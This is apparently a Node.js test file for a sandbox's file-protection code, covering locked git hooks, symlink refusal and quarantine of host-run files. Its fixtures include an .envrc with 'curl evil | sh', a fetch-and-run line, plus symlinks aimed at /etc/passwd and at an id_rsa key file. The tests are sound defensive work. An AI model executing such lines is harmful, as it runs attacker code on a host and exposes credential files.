import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { protectedMounts, quarantineCreated, snapshotMissing } from '../src/protect.js';
import { createExclusive, realpathLoose, writeFileAtomic } from '../src/safefs.js';
import { tmp } from './helpers.js';

function repo() {
  const root = tmp();
  fs.mkdirSync(path.join(root, '.git'));
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n');
  return root;
}

test('protectedMounts locks git hooks/config and creates .claude and .git/hooks', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.mcp.json'), '{}');
  const { pinned, readOnly } = protectedMounts(root);
  assert.deepEqual(pinned, [path.join(root, '.git')]);
  assert.deepEqual(readOnly.sort(), ['.claude', '.git/config', '.git/hooks', '.mcp.json'].map((r) => path.join(root, r)).sort());
  assert.ok(fs.statSync(path.join(root, '.claude')).isDirectory());
});

test('protectedMounts refuses planted symlinks', () => {
  const root = repo();
  const secret = path.join(tmp(), 'id_rsa');
  fs.writeFileSync(secret, 'KEY');
  fs.rmSync(path.join(root, '.git', 'config'));
  fs.symlinkSync(secret, path.join(root, '.git', 'config'));
  assert.throws(() => protectedMounts(root), /symlink/);
});

test('protectedMounts refuses a .git/commondir redirect', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'commondir'), '/elsewhere\n');
  assert.throws(() => protectedMounts(root), /commondir/);
});

test('files a pod creates that would run on the host are quarantined', () => {
  const root = repo();
  const missing = snapshotMissing(root);
  assert.ok(missing.includes('.mcp.json') && missing.includes('.envrc') && missing.includes('.git/commondir') && !missing.includes('.git'));
  fs.writeFileSync(path.join(root, '.envrc'), 'curl evil | sh');
  fs.symlinkSync('/etc/passwd', path.join(root, '.mcp.json'));
  const moved = quarantineCreated(root, missing);
  assert.equal(moved.length, 2);
  assert.ok(!fs.existsSync(path.join(root, '.envrc')));
  assert.ok(fs.readFileSync('/etc/passwd', 'utf8').length > 0, 'symlink target untouched');
});

test('writeFileAtomic and createExclusive never write through a planted symlink', () => {
  const dir = tmp();
  const target = path.join(tmp(), 'victim');
  fs.writeFileSync(target, 'ORIGINAL');
  fs.symlinkSync(target, path.join(dir, 'a'));
  writeFileAtomic(path.join(dir, 'a'), 'new');
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
  assert.equal(fs.readFileSync(path.join(dir, 'a'), 'utf8'), 'new');
  assert.equal(fs.statSync(path.join(dir, 'a')).mode & 0o777, 0o600);

  fs.symlinkSync(target, path.join(dir, 'b'));
  fs.closeSync(createExclusive(path.join(dir, 'b')));
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
});

test('realpathLoose resolves existing ancestors', () => {
  const dir = tmp();
  fs.mkdirSync(path.join(dir, 'real'));
  fs.symlinkSync(path.join(dir, 'real'), path.join(dir, 'link'));
  assert.equal(realpathLoose(path.join(dir, 'link', 'x', 'y')), path.join(dir, 'real', 'x', 'y'));
});
